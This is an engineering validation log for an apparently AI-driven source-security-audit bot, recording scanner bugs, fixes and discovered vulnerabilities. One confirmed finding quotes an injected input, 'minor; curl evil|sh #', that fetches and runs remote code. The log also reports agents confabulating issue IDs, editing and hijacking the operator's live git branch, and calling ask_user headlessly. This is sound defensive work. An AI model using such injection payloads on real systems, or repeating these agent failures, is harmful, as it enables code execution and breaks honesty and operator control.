# Seki + deepsec — validation

## 2026-06-26 — diagnostic re-run uncovers silent zero-language-scanner bug (run 019f02b8)
- Status: **diagnostic** (cancelled after the scanner phase, deepsec off, to capture gosec's stderr cheaply — no triage/$). Surfaced a bug more severe than the gosec gap.
- Finding: `run_lang_scanners` ran with **`subscanners:[]` — ZERO language scanners** (gosec/semgrep-go/js/py/bandit never invoked; the node took 1s), yet scan_health reported **`degraded:false` / healthy**. Root cause: `detect_tech` (claw/gpt-5.5) returned `langs` as a **nested bucket object** `{primary:[{name:Go}],secondary:[...],fixture_or_test_only:[...]}` instead of the documented flat array, and `_norm_langs` took the dict **keys** (`primary`/`secondary`/`fixture_or_test_only`) → none match a `lang-<id>.md` skill → no scanners. **Non-deterministic**: run 019f0119 parsed langs fine and ran the lang scanners; 019f02b8 didn't. A total silent loss of language-specific SAST masquerading as a healthy run.
- FIXED `5688378b1`: (1) type `tech_output.langs` as `string[]` (was `json`) so the model is forced to the flat shape; (2) harden `_norm_langs` to recursively walk any shape (flat array / descriptor array / nested bucket), preferring a descriptor's name/id. Unit-checked: the exact run-019f02b8 nested object now yields `['go','js','python','rust',…]`.
- Also confirmed (run 4): the `gosec` silent-gap fix (`aa1bf9ea9`) and version.yml fix hold; the gosec failure itself is now moot when langs parse correctly (gosec runs) and surfaced when it doesn't.
- Misses / follow-ups: **scan_health is the real anti-façade weak point** — it reported healthy with zero language scanners. It should assert that each detected primary language produced ≥1 lang-scanner artifact (hard-fail/degrade otherwise), independent of the langs-parsing fix. Triage also flailed Read-ing oversized scanner JSONs (trivy 1MB > the 256KB Read cap) — triage should grep/offset, not whole-file Read. Both noted for a future round.

## 2026-06-26 — re-run: version.yml fix re-scan-validated + gosec silent-gap fixed (run 019f0119)
- Status: **validated** — converged to `done` on a fresh static binary at the then-HEAD (post valkey/audit/v0.22.0 merges), opus-first default, ~55min, read-only. Second tour requested right after 019f00bf.
- Result: **0 confirmed / 1 uncertain / 69 dismissed**, 1050 raw findings, deepsec 16. scan_health **degraded** (see gosec finding).
- Closed-loop validation: the **`version.yml:92` GHA script-injection is GONE** from the findings (only an unrelated dismissed config note at version.yml:26-40 remains) — the env-var-intermediary fix (`d2300059f`) **verified by re-scan**. `detect_tech` ran clean on default config → the decouple fix (`036522d4f`) validated. The runner SSRF (`pkg/runner/loop.go`) re-surfaced (uncertain) — consistent across run 2, run 3, and the manual audit; still board-tracked. The server.go CSRF (confirmed in 019f00bf) did **not** re-surface this run — triage/voter non-determinism, not a fix; stays on the board radar.
- New dogfood finding + fix (Seki bot): scan_health went **degraded** on a **missing `gosec.json`**. Root-caused live: gosec runs fine **standalone** in the same `iterion-sandbox-sec:edge` image against the worktree (EXIT=1 on findings, 174KB output), so it's not a missing tool — `run_lang_scanners` recorded gosec's declared output path unconditionally and only checked exit code, while the cmd's `|| true` (gosec/semgrep exit non-zero merely on FINDING issues) masked the in-run failure → returncode 0 + phantom path + **`errors:[]`**, a SILENT Go-SAST gap caught only by scan_health's banner with no diagnosable reason. **FIXED `aa1bf9ea9`**: verify each scanner's declared output exists/non-empty after it runs; else append an error (with stderr tail) and drop the phantom path. Language-agnostic → any future silent scanner failure is now loud. (Next run will surface gosec's real stderr.)
- Lessons for next run: the gosec wrapper fix should make the in-run gosec failure self-diagnosing — read `run_lang_scanners` `errors[]` next time to root-cause why gosec fails in-sandbox when it passes standalone (suspect: build-cache/env or package-load under the long-lived container). Confirmed findings still have no durable on-disk home under sandbox+worktree:auto read-only (reconciled from `artifacts/majority_verdict`) — same surfacing gap as 019f00bf.

## 2026-06-26 — clean run + cross-check vs independent manual audit (run 019f00bf)
- Status: **validated** — converged end-to-end to `done` (detect_tech → generic/lang/custom scanners → deepsec → scan_join → scan_health → cap_findings → triage → 3-voter revalidate → majority → report_card), opus-first default, ~1h08m wall.
- Versions: bot sec-audit-source (post detect_tech-decouple `036522d4f`) · iterion `dev+8f867f8e7290` (static) · `iterion-sandbox-sec:edge` · remediate=false, severity_threshold=medium, deepsec on.
- Method: CLI `iterion run` into the operator's workspace `.iterion` store (studio-visible on :4891). **Default backends** (= opus-first triage/voters, claw+gpt-5.5 detect_tech). Read-only — no commits/branch.
- Result: `scan_health` **healthy** — 4/4 generic scanners (gitleaks/trivy/semgrep-auto) + deepsec + custom all present, **993 raw findings**, degraded=false (no façade). Pipeline produced **3 confirmed / 4 uncertain / 65 dismissed**.
- Value (confirmed):
  1. **GHA script-injection** `version.yml:92` — `run: pnpm release-it ${{ github.event.inputs.version }} --ci` interpolates a workflow_dispatch input into the shell; a dispatch value `minor; curl evil|sh #` runs arbitrary code in a job holding the App token + id-token:write. semgrep+deepsec+3 voters agreed. **NEW** (the parallel Go-focused manual audit missed it). **FIXED** `68c8dd5b2` (env-var intermediary; + the sibling `image.yml` `github.ref_name`/`github.ref` tag-name sinks).
  2. **Studio CSRF** `pkg/server/server.go:1066` — `/api/projects/switch` accepts `text/plain` (no preflight/Origin), so a visited page can re-point the studio workspace. → board/triage.
  3. **Runner SSRF TOCTOU** `pkg/runner/loop.go` — the standing board-tracked one (resolved IP discarded; git re-resolves → DNS-rebinding / 302-to-internal). **Re-confirmed independently by BOTH Seki and the manual audit.** Still defence-in-depth only; full fix = connect-time IP pinning / pod NetworkPolicy.
- Cross-check vs independent manual audit (parallel general-purpose agent, Go-focused): **complementary, not redundant**. Manual confirmed the runner SSRF, verified `safeNext` redirect SAFE, flagged the cloud opt-out env (Low). Seki added CI / secrets / desktop / full-tree breadth (the version.yml injection, the .env backups, desktop `SetSecret`/daemon-spawn). Neither alone was complete — that's the payoff of running both.
- Operational heads-up: gitleaks flagged **two CRITICAL local backup env files at repo root** — `.env.dogfood-bak`, `.env.zai-mode-bak` — real (non-`.example`) backups almost certainly carrying live provider keys. Not read (secrets policy). They're gitignored (not in history) but live on disk → recommend delete/rotate.
- Engine/bot/claw hardening (dogfood findings, all FIXED + committed):
  - **A (Seki bot):** `detect_tech` shared `ITERION_SEC_AUDIT_BACKEND`/`MODEL` with triage but with *different* defaults (claw/gpt-5.5 vs claude_code/opus). Setting the spine var to `claude_code` to get "opus-first" (already the default) dragged detect_tech onto claude_code+openai/gpt-5.5 → run died at the first node. Gave detect_tech its own `ITERION_SEC_AUDIT_DETECT_*` (`036522d4f`).
  - **B (engine/claude_code):** an invalid/unauthorized `--model` does NOT fail the CLI (`IsError=false`); its model-error sentence became the node result, ran two doomed formatting passes, then failed as an opaque "missing required field" schema error. Added `isModelUnavailableResult` fail-fast guard + unit test (`d36d2054d`).
- Misses / further work:
  - **report_card reached for `AskUserQuestion`** (ask_user) in a headless CLI run; it errored fast (0ms) and the agent recovered, but a report/board-emit node shouldn't have ask_user headless — strip it from report_card's toolset or auto-answer.
  - **Sandbox surfacing gap:** under sandbox + worktree:auto, board.create no-ops (C082) AND `findings.md` is written *inside the worktree*, which finalize removes on a read-only (no-commit) run → confirmed findings have **no durable on-disk home** except `.iterion/runs/<id>/artifacts/majority_verdict`. Reconciliation here was reconstructed from that artifact. Fix: write findings.md to the store dir (outside the worktree) or persist via the HTTP board path.
- Lessons for next run: opus-first default is solid — **zero** triage/voter stalls this run (vs the recurring gpt-5.5-forfait stalls). To force opus-first, set NOTHING. detect_tech is now decoupled. Surface findings.md outside the worktree so a read-only run leaves a durable report.

## 2026-06-23 — full clean run on opus, end-to-end (run 019ef389)
- Status: **validated** — first complete run to `done` (scan → cap → triage → 3 voters → majority → report_card), on first-class opus.
- Versions: bot sec-audit-source (opus-default fix `40a61ce97`) · iterion fresh static (campaign HEAD, incl. docker E2BIG fix) · `iterion-sandbox-sec:edge` · `remediate=false`.
- Method: CLI run, resumed twice. Two non-bot interruptions + two real fixes en route:
  1. cap-interrupted at 08:58 (Anthropic session limit) mid-voter → resumed on switched account.
  2. `majority_verdict` (tool node) hard-failed with `fork/exec /usr/bin/docker: argument list too long` — the 3 voter verdicts (37 findings × snippets) interpolated as `V1=<huge> V2=<huge> V3=<huge> python3 -c …` overflowed the docker-exec argv. Fixed in the **engine** (route oversized `bash -c` commands via stdin — `faf11a872` + `836e21094`), rebuilt, resumed → passed.
- Two bot fixes this campaign: triage/voter_v1/voter_v3 **defaulted to glm-5.2-first**, which hit GLM's structured-output reliability gap (missing required field). Re-defaulted to **opus first-class** with the z.ai/glm failover chain now opt-in via `ITERION_SEC_AUDIT_PROVIDER_CHAIN` (`40a61ce97`, per ADR-043). voter_v2 was already opus.
- Findings: deepsec surfaced a **real SSRF TOCTOU** — `validateRepoTarget` (pkg/runner/loop.go) resolves the repo host via `httpdial.ResolvePublicHost` but **discards the returned IP**; `git clone`/`fetch` then re-resolves the hostname at connect time → DNS-rebinding / 302-to-internal defeats the public-unicast guard. Attacker-controlled RepoURL via webhook/marketplace. **To triage onto the board** (verify it isn't already mitigated before re-surfacing).
- Engine hardening: the docker E2BIG fix (above) hardens **every** sandboxed tool node with large inter-node input, not just Seki.
- Lessons for next run: a sandboxed bot that interpolates large LLM outputs into a tool command needs either the engine stdin reroute (now in place) or a minimal-shape projection before the tool node; opus is the reliable default for the strict voter/triage schemas.

## 2026-06-22 — scans OK (deepsec 37; 2 CRIT/2 HIGH); triage stalled on gpt-5.5 (run 019ef04e-35f3)

- Status: **partial** — scanners ran and produced findings; the `triage` node **stalled** on sandboxed gpt-5.5 (cancelled after ~18 min / engine stall-alert) so auto-triage + board-emit did not complete.
- Versions: bot sec-audit-source · iterion v0.16.0 (110ea1c33) · `iterion-sandbox-sec:edge`
- Method: launched via studio API (`POST /api/runs`) for the HTTP board transport. `remediate=false`. claw gpt-5.5 forfait triage + glm-5.2 voters (z.ai). deepsec enabled.
- Result (scans on disk under `.iterion/security/scan/`): **deepsec finding_count 37** (raw severities: 2 CRITICAL, 2 HIGH, 2 HIGH_BUG, 6 BUG, 58 MEDIUM); gosec/semgrep-go/js/py/bandit ran (0 lang findings); gitleaks 730 (≈all noise from gitignored local `.env*` backups holding live keys, incl. the campaign's own `.env.dogfood-bak`). Top criticals to triage: RCE via unvalidated RepoURL→`git clone` (pkg/runner/loop.go:812), SSRF via RepoURL (pkg/runner/loop.go:689), non-unique shard run IDs (cmd/iterion/scan_shards.go:327) — **verification vs current guards (runner git-RCE guard / `ValidateCloneSource` / c9e18195) in progress; several may be already-mitigated.**
- Findings: (1) **`triage` stalls on sandboxed gpt-5.5 with the large detect_tech+all-scans input** — same gpt-5.5-forfait large-context root cause as Evoly's `aggregate_review`. Run triage on a 200K-context model (glm-5.2/opus) or cap its input. (2) trivy + semgrep-auto reported as errored in the triage summary even though semgrep-auto.json was produced — re-check the sec-image scanner invocations. (3) gitleaks scans gitignored `.env*` backups → 730 FP secret hits; the bot's FP suppression should exclude gitignored dotfiles.
- Lessons: re-run Seki's triage→revalidate→emit on **glm-5.2 (z.ai, 200K ctx)** after the z.ai reset to complete the audit; the raw `deepsec.json` is preserved so scans need not re-run.

## 2026-06-14 — C082 board-emit RESOLVED + validated end-to-end (run 019ec4fe)

- Status: **FIXED.** The board-emit gap that made Seki's `report_card` confabulate
  `board.create` ids now works: a sandboxed `claude_code` board-cap node reaches the
  per-run board MCP listener and its `create_issue` lands on the operator board.
- Versions: iterion branch `c082-board-emit` (closer `21e9a66b`, on top of the
  8-commit C082 stack `ee406ac6`→`816dcd0f`) · validated with a minimal
  `claude_code` `create_issue` bot, not Seki itself (faster signal, same code path).
- Method: dedicated worktree studio (fresh static binary, isolated store
  `/tmp/c082val`, `iterion-sandbox-sec:edge`); `merge_into=none`.
- Result: board total **0 → 1**, issue fetchable by real native id
  (`native:1714f23b…`, state `inbox`), `mcp__iterion_board__create_issue` invoked,
  run **finished**.
- Engine hardening — the closer after the 8-commit producer stack:
  1. **`serverInfo.version` (THE fix, `21e9a66b`)** — claude-code's MCP client
     connected over plain HTTP but Zod-**rejected** the `initialize` response because
     `serverInfo.version` was missing ("expected string, received undefined") → the
     whole connection was dropped → tools never surfaced → confabulation. Handler now
     returns `serverInfo.version "1.0.0"`. This disproves the earlier
     https-only / tool-search-deferral / session-id hypotheses (captured the actual
     ZodError via claude-code's own MCP debug against the live listener).
  2. **`alwaysLoad:true` on the board MCP server** — exempts it from claude-code's
     tool-search deferral so `mcp__iterion_board__*` surface without a ToolSearch hit.
- Lessons for next run: (a) the diagnostic `--debug` passthrough does **not** ship —
  claude-code eats the `--debug` value as a positional prompt arg, conflicting with
  `--input-format stream-json` (CLI exit 1); use `--debug=mcp` +
  `CLAUDE_CODE_DEBUG_LOGS_DIR` to re-capture. (b) Re-run Seki itself sandboxed to
  confirm `report_card` now posts real (not confabulated) ids to the board.
- Full technical writeup: [docs/c082-board-emit-fix-plan.md](../c082-board-emit-fix-plan.md).

## 2026-06-14 — real-bot Seki re-run for C082: 2 forfait-robustness bugs (runs 019ec55a, 019ec579)

- Status: **partial.** Goal was to confirm `report_card` posts REAL board ids on
  the actual bot (not just the minimal validation bot above). BOTH attempts
  **failed before `report_card`**, on two DISTINCT bugs — neither is C082 (C082
  board-emit is proven by the minimal bot; the per-run board MCP listener started
  fine on both: `host.docker.internal:42053`/`:37717`). Root cause of both: the
  flaky `claw/openai/gpt-5.5` (forfait) agents return `json`-typed fields in
  **variable shapes** across runs, and several deterministic consumers don't
  normalize them. Method: worktree binary (C082) + isolated studio :4899 +
  `iterion-sandbox-sec:edge` scanning a clean iterion clone, `enable_deepsec=false`,
  `remediate=false`.
- **Bug A — `filter_cached_files` crash → FIXED (`d6ad8f3c`).** `triage` emitted
  `candidates` as a dict keyed by candidate-id (`{CAND-001:{...}}`) instead of a
  list; `for c in candidates: c.get(...)` iterated the dict KEYS (strings) →
  `AttributeError: 'str' object has no attribute 'get'` (exit 1). This is the
  newer incremental-cache node, never run end-to-end before (the 2026-06-13 run
  had no such node), so it shipped unguarded while `majority_verdict` was already
  defensive. Fix: normalize dict→list at the funnel that feeds `fresh_candidates`.
- **Bug B — `run_lang_scanners` exit 127 → ROOT-CAUSED, not fixed (engine).**
  `detect_tech` returned `langs` as a **list of plain strings** in run #2
  (`["Go","TypeScript",...]`) vs a **dict** in run #1. iterion's
  `shellEscapeValue` renders a `[]interface{}` of strings **space-separated**, so
  `LANGS={{input.langs}}` became `LANGS=Go TypeScript JavaScript …` → the shell
  set `LANGS=Go` and ran `TypeScript` as a command → `bash: line 1: TypeScript:
  command not found` (exit 127). The dict shape JSON-marshals to ONE shell-escaped
  token, which is why run #1 got past it. The node's own `_norm_langs` handles
  both shapes — but the value never survives the shell. **Recommended fix
  (tracked, NOT done — blast radius):** make `shellEscapeValue` render a
  `[]interface{}` of strings as compact JSON (a single shell-escaped token, like
  it already does for maps and complex slices), reserving space-join for typed
  `[string]` fields (which arrive as `[]string`, not `[]interface{}`). 8 catalog
  bots use `VAR={{...}}` patterns, so this needs a blast-radius audit + test
  before shipping ([pkg/backend/model/executor_tool.go](../../pkg/backend/model/executor_tool.go) `shellEscapeValue`).
- Systemic lesson: gpt-5.5/forfait `json` fields are shape-unstable (dict↔list)
  run-to-run; every deterministic consumer (python tool node) of an agent `json`
  array-field must normalize, OR the engine must render `json` fields canonically.
  `majority_verdict` is the model (it normalizes both shapes + guards
  `isinstance`). Until the engine fix lands, Seki's SAST read-pipeline is not
  reliably end-to-end on forfait; running its agent nodes on `claude_code`/opus
  (`ITERION_SEC_AUDIT_BACKEND=claude_code`) would sidestep the shape flakiness for
  a clean validation.

## 2026-06-13 (retest, FIXED) — scanner invocations repaired → full pipeline (run 019ec230)

- Status: **scan_health now PASSES; Seki runs the full read pipeline end-to-end**
  (detect_tech → scanners → scan_health → cap_findings → triage → N-vote → report_card).
  The 019ec1e0 hard-fail below was NOT a broken sec image — it was four broken scanner
  *invocations* in the bot/skills (the binaries all work). Fixed in `a8fac4c5`; **no
  Dockerfile change needed.**
- The fixes (see commit): **semgrep** `--config=auto --metrics=off` → `--config=p/default`
  (auto-config is rejected with metrics off — the silent error that left only 1/3 generic
  scanners; this is THE unblock — semgrep-auto.json now lands → 2/3 floor → scan_health
  passes degraded). **gosec** was scanning `.iterion/worktrees/` (dozens of repo copies) →
  11 min/no-output; `-exclude-dir=.iterion -exclude-dir=.works` → **125 s + 168 KB output**
  (validated standalone). **trivy** choked traversing `.iterion`/`.works` → `--scanners`
  (modern flag, was deprecated `--security-checks`) + `--skip-dirs=.iterion,.works,vendor`.
- **Validated end-to-end**: 019ec230 reached scan_health (degraded, 2/3 generic) → triage →
  N-vote (voter_v1/v2/v3) → report_card. (One earlier attempt was drained mid-N-vote by a
  *parallel session*'s `.go` edit restarting `task studio:dev` — an environment artifact,
  not a Seki bug; resumed from the `voter_v1` checkpoint to finish.)
- **Value proven**: even deepsec-OFF, Seki surfaced a **real CRITICAL candidate** —
  *"RCE in cloud runner via unvalidated RepoURL passed to git clone (pkg/runner/loop.go)"*
  (the file does clone `msg.RepoURL` at L689 → `prepareRepoWorkspace` L789). Status
  `uncertain` (N-vote didn't fully confirm) — worth operator triage.
### C082 root cause + fix design (board-emit, the remaining gap)

Traced precisely (2026-06-13): the sandboxed board MCP HTTP transport is **declared on
both ends but the PRODUCER side is never wired**, so sandboxed claude_code/claw board
caps silently no-op and the agent **confabulates** the board.create IDs:
- **Server side exists**: `BoardMCPTokenRegistry` + `RegisterBoardMCPRoutes(/api/v1/mcp/board,
  store, reg)` ([pkg/server/mcp_board_handler.go](../../pkg/server/mcp_board_handler.go),
  server.go:870) — BUT `boardMCPTokens.Register(token, caps)` is **never called** for a run.
- **Consumer side exists**: `Task.BoardHTTPEndpoint`/`BoardRunToken` + claude_code.go:477
  consume them (and :490 warns + disables board MCP when empty) — BUT **nothing in the
  runtime/executor ever SETS them** (grep: zero assignments). So they're always "" →
  board MCP disabled under sandbox → confabulation.
- **Fix design**: (1) plumb a `register(caps)→token` closure + a board endpoint URL from
  the server into `model.ExecutorSpec`→`ClawExecutor`; (2) in the Task builder
  ([executor.go ~1245](../../pkg/backend/model/executor.go)) for sandboxed board-cap nodes:
  `task.BoardRunToken = register(caps); task.BoardHTTPEndpoint = url`. (3) **CRITICAL
  networking caveat** — the endpoint must be *container-reachable*: `iterion studio` binds
  `127.0.0.1` (loopback, NOT reachable via `host.docker.internal`); the egress proxy only
  works because the docker driver's `ProxyConfigurer` binds a gateway-reachable interface.
  The board endpoint needs the same (bind gateway/0.0.0.0, or tunnel via the proxy). This
  networking requirement = it MUST be live-validated against a container (a sandboxed run
  confirming the write lands), so it should be implemented when the studio is free (no
  parallel session to drain on the rebuild) or against a dedicated `iterion server` bound
  on a gateway-reachable port. Not shipped blind.

- **board-emit (C082) STILL DOESN'T LAND (bilan #4 persists — a distinct engine gap).**
  report_card DID invoke `board.create`×3 / `board.label`×3 / `board.move`×2 and its
  `created_issues` output carries real native-looking IDs (`native:90543c66…`), but the
  issues are **NOT on the operator's board** (total unchanged at 94; fetch-by-id + every
  label query miss). The sandboxed board MCP HTTP transport (`/api/v1/mcp/board` +
  ephemeral run token) returns success but the writes don't persist to the operator's
  native board — even when launched via the studio. Seki's findings are recoverable from
  the run (`iterion report --run-id 019ec230`), not the board. This is the one remaining
  Seki gap; it is **separate from the scanner fixes** (which are done) and needs a focused
  look at the sandboxed board HTTP transport.
- **Residual (tracked, non-blocking)**: gosec + trivy still emit nothing *inside the
  sandbox specifically* (both work standalone) — a deeper sandbox/proxy/go-module
  interaction. scan_health passes on gitleaks + semgrep (2/3) regardless; semgrep
  (go/js/py/default) + bandit carry the SAST coverage; deepsec ON remains the
  highest-value path (019ec142).

## 2026-06-13 (retest) — engine fixes + safe default, via STUDIO (run 019ec1e0)

- Status: **engine fixes validated via the studio path; safe default shipped; but
  the run HARD-FAILED at `scan_health` — correctly — because the sec image's generic
  scanner toolchain is broken.** detect_tech (which FAILED in 019ec10f/019ec13a) now
  completes; the read chain ran to the coverage gate, which then refused to certify a
  thin audit. Board-emit NOT reached (failed before `report_card`).
- Versions: bot sec-audit-source 0.1.0 · iterion 778b9860 / bbdca0da / ea61817a /
  92c40d62
- Method: launched via **studio** `POST /api/runs` (so the HTTP board transport is
  wired — C082), `remediate=false` (now the default), `enable_deepsec=false` (lean:
  validate generic+lang scanners → triage → report → board-emit cheaply; deepsec's
  vuln-finding was already proven in 019ec142). Sandbox `iterion-sandbox-sec:edge`.

### Validated by the engine fixes (the headline)
- **detect_tech now completes** (claw + sandbox). In 019ec10f/019ec13a it died at
  this first claw node; the TLS-inspect-proxy hang (FIXED 778b9860) was the cause.
  The whole read chain ran: inventory → detect_tech → context → diff_scope →
  plan_shards → run_generic_scanners → run_lang_scanners → … Confirms the proxy +
  empty-tool-result fixes hold for the **operator's actual (studio) path**, not just
  CLI.
- **remediate=false (92c40d62)** — `iterion validate` clean; the run is read-only by
  default (no live-tree edits, no branch hijack). Safe under `task studio:dev`.
- **{{run.id}} (ea61817a)** — opt-in remediation will now name its branch
  `iterion/sec-fix/<real-run-id>` instead of the literal `iterion/sec-fix/run.id`.

### scan_health hard-failed — CORRECTLY (the headline blocker)
The run reached `scan_health` and **hard-failed (run_failed, exit 1)** with:
`{"generic_expected":3,"generic_present":1,"min_generic":2,"missing":[trivy.json,
semgrep-auto.json (generic), gosec.json (lang)],"total_findings_seen":1596,
"healthy":false,"degraded":true}` — *"only 1 of 3 always-on generic scanners produced
output (need ≥2)"*. This is the **anti-façade gate working as designed**: it refuses to
certify an audit when the core generic toolchain is down, even though lang/custom
scanners saw 1596 raw findings. (019ec142 passed because ≥2 generic scanners happened
to run that time — the toolchain is flaky.)

### THE BLOCKER: the sec image's scanner toolchain is broken (infra, not engine/bot)
Scanners are installed (`trivy 0.70.0`, `gosec`, `gitleaks 8.21.2`, `govulncheck`,
`semgrep` on PATH) but **fail at runtime** in `iterion-sandbox-sec:edge`:
1. **trivy** → `FATAL ... unable to create temporary directory: stat /tmp/trivy-10:
   no such file or directory`. A /tmp/TMPDIR issue in the image (reproduced with a bare
   `docker run … trivy fs`). Also the bot still passes the **deprecated** `--security-checks`
   flag (renamed `--scanners` in modern trivy) — fix both.
2. **semgrep** → `semgrep --version` prints nothing; `--config=auto` needs to fetch its
   rule pack from the registry (network) and produced no output. Broken install and/or
   registry fetch.
3. **gosec** → ran **>11 min** then produced **no `gosec.json`** (timed out / errored
   after type-checking the full import graph — `-exclude-dir=vendor` filters reporting,
   not loading). Needs a timeout + scoping.
→ **Both sec bots (Seki + Depsy) are gated on this.** The fix is a focused
`sandbox/sec/Dockerfile` + scanner-invocation pass (TMPDIR for trivy, `--scanners`,
fix/repin semgrep, bound gosec), then republish via CI `build-sandbox-sec`. Not done
here — it's image infra, out of scope for the bot retest; tracked as the sec-bot blocker.

### Lessons for next run
- Launch sec bots **via the studio** (board transport wired) — a bare CLI run no-ops
  board writes (C082). detect_tech + the claw path now work end-to-end (engine fixes).
- **Don't trust sec-bot output until the sec image's trivy/semgrep/gosec are fixed** —
  `scan_health` will (rightly) hard-fail or banner on the broken toolchain. deepsec ON
  is the only currently-working value path (019ec142), and even it runs degraded.

## 2026-06-13 — iterion self-audit dogfood (runs 019ec10f, 019ec13a, **019ec142**)

> **Update — run 019ec142 (after both engine fixes + static-binary re-copy):
> the SAST read pipeline VALIDATED end-to-end, with 3 new findings.**
> - Ran clean through `detect_tech → scanners → scan_health → cap_findings →
>   triage → adversarial N-vote → merge_with_cache → report_card`. The
>   sandbox-claw fixes (backendIsClaw + static binary) **work**. ($4.26, 91k
>   tokens, 285 steps before the remediation phase self-killed — see #5.)
> - **Value:** deepsec found 14 candidates → triage 13 → N-vote **11 confirmed
>   (2 HIGH incl. the SSRF), 2 uncertain**; results written to
>   `.iterion/security/findings.md`. The detect_tech tech-map is excellent.
> - **#3 Degraded scanner coverage (medium):** `scan_health` correctly flagged
>   `degraded` — **`trivy` + `semgrep-auto` errored / produced no output** in the
>   `iterion-sandbox-sec` image (2 of 4 generic scanners missing; it cleared the
>   `min_generic=2` floor so it ran with a banner rather than hard-failing). All
>   13 triaged candidates came from **deepsec**; the generic AST/regex scanners
>   contributed 0. The sec image's trivy + semgrep-auto invocation needs fixing.
> - **#4 Board emit didn't land (medium):** `report_card` wrote findings.md
>   claiming "2 board issues created (high)", but the board has **0**
>   `source:sec-audit-source` issues. Sandboxed `report_card` emits via the HTTP
>   board transport (`/api/v1/mcp/board` + run-token); the writes didn't surface
>   (failed silently or were confabulated). Seki's value is currently trapped in
>   the gitignored findings.md, not on the board as designed.
> - **#5 SEVERE — `remediate` + `enable_deepsec` default `true`, and Seki has NO
>   `worktree: auto`.** So by default Seki *edits code* (it is **not** read-only,
>   contra the doc "does not fix unless remediate enabled"), and the edits hit the
>   **main tree**. `patch_author` edited `pkg/webhooks/generic/generic.go`
>   (SSRF-hardening intent) → its own `.go` edit tripped `task studio:dev`
>   watchexec → backend restart → `context canceled`. Worse, it was cancelled
>   **mid-Edit**, leaving the file with unused imports → **broke compilation → the
>   `go run` studio backend couldn't restart → studio bricked** until the partial
>   patch was `git restore`d. Same watchexec self-kill class as Willy, but it also
>   takes the studio down. **Fix directions:** default `remediate=false` (match the
>   doc + make Seki read-only by default); give the remediation phase
>   `worktree: auto` isolation; never run a remediating Seki under `task
>   studio:dev`. (deepsec default-on also makes every run long/expensive.)
> - **#6 Remediation hijacked the operator's git branch (severe).** With no
>   worktree, remediation ran `git checkout -b` **on the main checkout**, moving it
>   off `main` onto a branch named literally **`iterion/sec-fix/run.id`** — an
>   **unrendered `{{run.id}}` template**. Subsequent operator commits then silently
>   landed on that branch instead of `main` (reconciled by hand). Two bugs: (a)
>   remediation must use an isolated worktree, never `git checkout` the live tree;
>   (b) the branch-name template isn't substituted (`run.id` literal). Reinforces
>   the case for default `remediate=false`.

- Status: **read pipeline VALIDATED (019ec142); remediation phase unsafe
  (self-kill + studio brick). Original blockers ↓ fixed.**
- Versions: bot sec-audit-source 0.1.0 · iterion 7fea84cd→f247f360
- Method: `POST /api/runs`, `severity_threshold=high`, sandboxed
  (`iterion-sandbox-sec:edge`, present). Goal: re-find the known HIGH
  `source:sec-audit-self` issues (SSRF `runs_preview.go`, path-traversal
  `runs_files.go`) and validate `scan_health` + `cap_findings`.
- Result: **never reached the scanners** — failed at `detect_tech` (first `claw`
  node) both runs. But each failure root-caused a real sandbox/claw bug:
  1. **`backendIsClaw` missed env-templated backends (FIXED `f247f360`).** Seki's
     nodes use `backend: "${ITERION_SEC_AUDIT_BACKEND:-claw}"`; the IR stores it
     verbatim, so `containsClawNode` read it as non-claw at spec-build time and
     `addClawBinaryMount` never bind-mounted the host iterion → the in-container
     `iterion __claw-runner` died with `exec: "iterion": executable file not
     found in $PATH`. Fix: expand the template in `backendIsClaw` like the
     executor does (`ir.ExpandEnvWithDefault`). Regression test added. **This also
     unblocks Depsy (`sec-audit-deps`)**, which uses the same pattern.
  2. **The host iterion bind-mounted into the container must be STATIC.** Once #1
     mounted it, the next failure was `exec: /usr/local/bin/iterion: no such file
     or directory` — the mounted binary was a devbox `go build` (default
     `CGO_ENABLED=1`) **dynamically linked against nix glibc**, whose loader isn't
     in the container. Fix is operational: install a static build
     (`CGO_ENABLED=0` / `task build`); CLAUDE.md's live-dogfood note now spells
     this out. (Candidate engine hardening: `iterion sandbox doctor` / the mount
     path could detect a dynamic host binary and fail with a clear message
     instead of a retry-then-cryptic-ENOENT; or the sec/full images could bake a
     static iterion on PATH.)
- Lessons for next run: after the operator re-copies the **static** binary to
  `/usr/bin/iterion`, re-launch; `detect_tech` should clear and the run proceed to
  the scanners + `scan_health` gate. Then validate it re-finds the known HIGH
  findings. The SAST capability itself is unproven on iterion *yet* — only the
  sandbox plumbing was exercised.

---

**Status:** validated end-to-end (2026-06). **Scope of this report:** the
capability and the engineering hardening only — it carries **no information
about the audited codebase** (a third-party repository; all target details are
deliberately omitted or generalized).

## Summary

Seki (the `sec-audit-source` bot) with the integrated **deepsec** scanner and
the in-run **remediation** phase was exercised against a real-world repository.
It demonstrably:

1. **finds subtle, high-value vulnerabilities that signature-based scanners
   miss** (deepsec's LLM analysis vs the regex/AST scanners);
2. **authors complete, root-cause, test-backed fixes** — including a hard
   design-level one it had earlier had the discipline to *decline*;
3. **drives the full pipeline** detect → context → scan → triage →
   adversarial N-vote → verified-remediation ladder → **human approval gate**.

The exercise also hardened the pipeline: **six runtime bugs were found and
fixed** while driving real runs.

## What was validated

- The integrated pipeline: `detect_tech → project_context → scanners
  (generic + language + deepsec) → triage/dedup → N-voter "disprove"
  revalidation → report_card → remediation ladder (patch → build → reproduce →
  regress → re-attack → isolated review → aggregate) → human gate`.
- **deepsec** as an LLM scanner alongside the deterministic scanners, on the
  local Claude Code subscription backend (no API key).
- **apply-gated** remediation: edits applied in a worktree, paused at a human
  gate before anything merges.

## Method

A single end-to-end run against a large real-world repository — a compiled
backend plus a JS/TS frontend, thousands of tracked files, with
authentication, cryptography, and a database. Backend = local Claude Code
subscription. *(No further target detail is recorded here by design.)*

## Results

### deepsec finds what signature scanners miss

deepsec surfaced around a dozen findings, including logic/auth issues invisible
to the deterministic scanners (which contributed container/config and
standard-rule matches). Representative **classes** (generalized):

- an **authentication-relay CSRF** (account-takeover class): a sensitive login
  step completed with no binding to the browser that initiated it, so a
  relayed out-of-band confirmation could authenticate a session it never
  started;
- a **key-management fail-open**: a development key path reachable outside
  production;
- a **session-cookie integrity gap**;
- **container / supply-chain hardening**: runtime running as root, mutable
  base-image tags (no digest pinning);
- a **nil-dereference DoS** in an unrecovered worker goroutine.

The signature scanners found none of the first three.

### Seki authors complete, root-cause, tested fixes — including the hard one

The headline result is on the **authentication-relay CSRF** — a design-level
fix spanning several files. In an earlier run Seki **correctly declined** to
patch it with a minimal one-file diff, explicitly refusing to ship a
backend-only change that would build and test green while leaving the flaw
exploitable ("security-theatre the ladder cannot detect") and routing it to
human review.

